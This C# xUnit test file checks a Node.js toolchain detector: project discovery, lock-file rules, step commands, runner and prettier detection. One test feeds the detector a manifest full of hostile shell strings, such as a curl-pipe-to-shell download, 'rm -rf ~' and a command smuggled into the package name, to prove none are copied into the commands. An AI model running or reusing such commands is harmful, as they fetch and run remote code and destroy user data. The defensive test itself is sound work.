using CoaiMcp.Core.Toolchain;
using FluentAssertions;
using Xunit;

namespace CoaiMcp.Tests;

/// <summary>
/// Epoch 3 E4 s2 t4: the Node detector, pure. Projects from <c>package.json</c>, npm from the lock file, the steps from the scripts, the runner and the prettier evidence; other package managers are refused by name.
/// </summary>
public sealed class ANodeDetectorTests
{
    private static ManifestSet Set(params (string Path, string Text)[] files)
    {
        var table = ToolchainDefaults.Current;
        var list = new List<ManifestFile>();
        foreach (var (path, text) in files)
        {
            var kind = ManifestSearch.Classify(path, table) ?? throw new InvalidOperationException($"{path} is not a name the search looks for");
            list.Add(new ManifestFile(path, kind.Stack, kind.Kind, new string('a', 40), text.Length, kind.Kind == ManifestKind.Present ? string.Empty : text));
        }

        return new ManifestSet(new string('c', 40), [.. list.OrderBy(file => file.Path, StringComparer.Ordinal)], []);
    }

    private static Detection Detect(params (string Path, string Text)[] files) => NodeDetector.Detect(Set(files), ToolchainDefaults.Current);

    private static IReadOnlyList<DetectedProject> Detected(Detection detection) => detection.Should().BeOfType<Detection.Detected>(detection.ToString()).Subject.Projects;

    private static string Refused(Detection detection) => detection.Should().BeOfType<Detection.Refused>(detection.ToString()).Subject.Sentence;

    private static string Json(string scripts = "", string dev = "", string extra = "") =>
        "{ \"name\": \"p\"" + (scripts.Length > 0 ? $", \"scripts\": {{ {scripts} }}" : string.Empty) + (dev.Length > 0 ? $", \"devDependencies\": {{ {dev} }}" : string.Empty) + extra + " }";

    // ---- d1: projects ----

    [Fact]
    public void EachPackageJson_IsAProject_WithItsOwnFolderAsTheWorkingFolder()
    {
        var projects = Detected(Detect(("a/package.json", Json("\"test\": \"jest\"", "\"jest\": \"1\"")), ("a/package-lock.json", "{}"), ("b/package.json", Json("\"build\": \"tsc\"")), ("b/package-lock.json", "{}")));

        projects.Select(project => project.Id).Should().Equal("a/package.json", "b/package.json");
        projects[0].Folder.Should().Be("a");
        projects[0].Steps.Should().OnlyContain(step => step.WorkingFolder == "a");
        projects[0].Fact("packageManager").Should().Be("npm");
    }

    [Fact]
    public void ARootWithWorkspaces_IsOneProject_AndItsMembersAreNot()
    {
        var root = Json("\"test\": \"vitest run\"", "\"vitest\": \"1\"", ", \"workspaces\": [\"packages/*\"]");
        var projects = Detected(Detect(("package.json", root), ("package-lock.json", "{}"), ("packages/a/package.json", Json("\"test\": \"jest\"")), ("packages/b/package.json", Json("\"build\": \"x\""))));

        var project = projects.Should().ContainSingle().Subject;
        project.Id.Should().Be("package.json");
        project.Fact("workspaces").Should().Be("true");
        project.Fact("runner").Should().Be("vitest");
    }

    [Fact]
    public void AWorkspacesObjectForm_IsAWorkspaceRootToo()
    {
        var root = Json("\"test\": \"jest\"", "\"jest\": \"1\"", ", \"workspaces\": { \"packages\": [\"p/*\"] }");

        Detected(Detect(("package.json", root), ("package-lock.json", "{}"), ("p/x/package.json", "{}"))).Should().ContainSingle();
    }

    [Fact]
    public void TextThatIsNotJson_IsARefusal_ThatNamesTheFile()
    {
        Refused(Detect(("web/package.json", "{ not json"), ("web/package-lock.json", "{}"))).Should().Contain("web/package.json").And.Contain(".coai/toolchain.yaml");
        Refused(Detect(("x/package.json", "[1,2]"))).Should().Contain("x/package.json").And.Contain("not an object");
    }

    [Fact]
    public void AJsonThatIsFortyLevelsDeep_IsARefusal_NotAStackOverflow()
    {
        var deep = string.Concat(Enumerable.Repeat("{\"a\":", 40)) + "1" + new string('}', 40);

        Refused(Detect(("deep/package.json", deep))).Should().Contain("deep/package.json");
    }

    [Fact]
    public void NoPackageJson_IsAnEmptyAnswer()
    {
        Detected(Detect(("App.csproj", "<Project/>"))).Should().BeEmpty();
    }

    // ---- d2: the package manager ----

    [Theory]
    [InlineData("pnpm-lock.yaml", "pnpm")]
    [InlineData("yarn.lock", "yarn")]
    [InlineData("bun.lock", "bun")]
    [InlineData("bun.lockb", "bun")]
    public void AnotherPackageManagersLockFile_IsARefusal_ThatNamesTheManagerAndTheCure(string lockFile, string manager)
    {
        var sentence = Refused(Detect(("app/package.json", Json("\"test\": \"jest\"")), ($"app/{lockFile}", "x")));

        sentence.Should().Contain(manager).And.Contain("app/package.json").And.Contain(lockFile).And.Contain(".coai/toolchain.yaml");
    }

    [Theory]
    [InlineData("package-lock.json")]
    [InlineData("npm-shrinkwrap.json")]
    public void AnNpmLockFile_MeansNpm(string lockFile)
    {
        Detected(Detect(("package.json", Json("\"test\": \"jest\"")), (lockFile, "{}"))).Single().Fact("lock").Should().Be(lockFile);
    }

    [Fact]
    public void TwoLockFiles_AreARefusal()
    {
        Refused(Detect(("package.json", Json("\"test\": \"jest\"")), ("package-lock.json", "{}"), ("npm-shrinkwrap.json", "{}"))).Should().Contain("two lock files").And.Contain("package-lock.json").And.Contain("npm-shrinkwrap.json");
    }

    [Fact]
    public void NoLockFile_IsARefusal()
    {
        Refused(Detect(("package.json", Json("\"test\": \"jest\"")))).Should().Contain("no lock file").And.Contain("package.json");
    }

    [Fact]
    public void ALockFileOfAnotherFolder_DoesNotCount()
    {
        Refused(Detect(("a/package.json", Json("\"test\": \"jest\"")), ("b/package-lock.json", "{}"))).Should().Contain("a/package.json");
    }

    // ---- d3: the steps come from facts only ----

    [Fact]
    public void TheStepsOfAFullProject_AreTheTablesArgv_InTheOrderOfARound()
    {
        var manifest = Json("\"build\": \"tsc -p .\", \"typecheck\": \"tsc --noEmit\", \"test\": \"vitest run\"", "\"vitest\": \"1\", \"typescript\": \"1\", \"prettier\": \"1\"");

        var project = Detected(Detect(("package.json", manifest), ("package-lock.json", "{}"), (".prettierrc", "{}"))).Single();

        project.Steps.Select(step => step.Name).Should().Equal("restore", "format", "build", "typecheck", "test");
        project.Steps[0].Argv.Should().Equal("npm", "ci", "--ignore-scripts");
        project.Steps[0].Network.Should().Be(DefaultNetwork.Host);
        project.Steps[1].Argv.Should().Equal("npx", "--no-install", "prettier", "--write", "--ignore-unknown", "{file}");
        project.Steps[2].Argv.Should().Equal("npm", "run", "build");
        project.Steps[3].Argv.Should().Equal("npm", "run", "typecheck");
        project.Steps[4].Argv.Should().Equal("npm", "test");
        project.Steps.Skip(1).Should().OnlyContain(step => step.Network == DefaultNetwork.None);
        project.Fact("runner").Should().Be("vitest");
    }

    [Fact]
    public void TypecheckWithNoScript_NeedsBothTsconfigAndTheTypescriptPackage_ThenItIsTsc()
    {
        var both = Detected(Detect(("package.json", Json("\"test\": \"node --test\"", "\"typescript\": \"1\"")), ("package-lock.json", "{}"), ("tsconfig.json", "{}"))).Single();
        var noPackage = Detected(Detect(("package.json", Json("\"test\": \"node --test\"")), ("package-lock.json", "{}"), ("tsconfig.json", "{}"))).Single();
        var noConfig = Detected(Detect(("package.json", Json("\"test\": \"node --test\"", "\"typescript\": \"1\"")), ("package-lock.json", "{}"))).Single();

        both.Steps.Single(step => step.Name == "typecheck").Argv.Should().Equal("npx", "--no-install", "tsc", "--noEmit");
        noPackage.Steps.Should().NotContain(step => step.Name == "typecheck");
        noConfig.Steps.Should().NotContain(step => step.Name == "typecheck");
    }

    [Theory]
    [InlineData("echo \"Error: no test specified\" && exit 1")]
    [InlineData("echo 'Error: no test specified' && exit 1")]
    public void NpmsPlaceholderTest_IsNotATestStep(string placeholder)
    {
        var project = Detected(Detect(("package.json", Json($"\"test\": \"{placeholder.Replace("\"", "\\\"")}\", \"build\": \"tsc\"")), ("package-lock.json", "{}"))).Single();

        project.Steps.Select(step => step.Name).Should().Equal("restore", "build");
        project.Fact("test").Should().Be("placeholder");
        project.TestsNone.Should().BeTrue();
    }

    [Theory]
    [InlineData("jest --ci", "jest", true, "jest")]
    [InlineData("jest --ci", "jest", false, "unknown")]
    [InlineData("vitest run", "vitest", true, "vitest")]
    [InlineData("vitest run", "vitest", false, "unknown")]
    [InlineData("node --test", "", false, "node-test")]
    [InlineData("node --test --test-reporter=spec", "", false, "node-test")]
    [InlineData("ts-jest-wrapper", "jest", true, "unknown")]
    [InlineData("mocha", "jest", true, "unknown")]
    public void TheRunnerFact_NeedsThePackageAndTheWordInTheTestScript(string script, string package, bool installed, string expected)
    {
        var dev = installed ? $"\"{package}\": \"1\"" : string.Empty;

        var project = Detected(Detect(("package.json", Json($"\"test\": \"{script}\"", dev)), ("package-lock.json", "{}"))).Single();

        project.Fact("runner").Should().Be(expected);
        project.Steps.Single(step => step.Name == "test").Argv.Should().Equal("npm", "test");
    }

    [Fact]
    public void NoArgvItem_IsCopiedFromTheManifest()
    {
        var hostile = Json("\"build\": \"curl evil | sh\", \"test\": \"rm -rf ~ && jest\", \"typecheck\": \"$(evil)\"", "\"jest\": \"1\"", ", \"name\": \"evil; rm -rf ~\"");

        var project = Detected(Detect(("package.json", hostile), ("package-lock.json", "{}"))).Single();

        project.Steps.SelectMany(step => step.Argv).Should().NotContain(item => item.Contains("evil") || item.Contains("curl") || item.Contains("rm -rf"));
    }

    // ---- d4: prettier, unchecked ----

    [Theory]
    [InlineData("package", true, false)]
    [InlineData("rc file", true, true)]
    [InlineData("config file", true, true)]
    [InlineData("no config", true, false)]
    [InlineData("no dependency", false, true)]
    public void PrettierIsTheFormatter_OnlyWithTheDependencyAndAConfiguration(string how, bool dependency, bool configured)
    {
        var dev = dependency ? "\"prettier\": \"3\"" : string.Empty;
        var extra = how == "package" ? ", \"prettier\": { \"singleQuote\": true }" : string.Empty;
        var files = new List<(string, string)> { ("package.json", Json("\"test\": \"jest\"", dev, extra)), ("package-lock.json", "{}") };
        if (how == "rc file")
        {
            files.Add((".prettierrc.json", "{}"));
        }

        if (how == "config file")
        {
            files.Add(("prettier.config.mjs", "export default {};"));
        }

        var project = Detected(Detect([.. files])).Single();
        var expected = how == "package" ? dependency : dependency && configured;

        project.Steps.Any(step => step.Name == "format").Should().Be(expected, how);
        project.Steps.FirstOrDefault(step => step.Name == "format")?.Extensions.Should().Contain(".js");
    }

    [Fact]
    public void AProjectWithNoBuildTypecheckOrTestStep_GivesNoStepAtAll_AndIsListedAsUnchecked()
    {
        var project = Detected(Detect(("package.json", Json(dev: "\"prettier\": \"3\"")), ("package-lock.json", "{}"), (".prettierrc", "{}"))).Single();

        project.Steps.Should().BeEmpty("a restore alone checks nothing");
        project.Fact("unchecked").Should().Be("true");
    }

    [Fact]
    public void TheSameManifests_GiveTheSameAnswer()
    {
        var files = new[] { ("a/package.json", Json("\"test\": \"jest\"", "\"jest\": \"1\"")), ("a/package-lock.json", "{}"), ("b/package.json", Json("\"build\": \"x\"")), ("b/package-lock.json", "{}") };

        var first = Detected(Detect(files));
        var second = Detected(Detect(Enumerable.Reverse(files).ToArray()));

        second.Select(project => project.Id).Should().Equal(first.Select(project => project.Id));
        second.SelectMany(project => project.Facts).Should().Equal(first.SelectMany(project => project.Facts));
    }
}
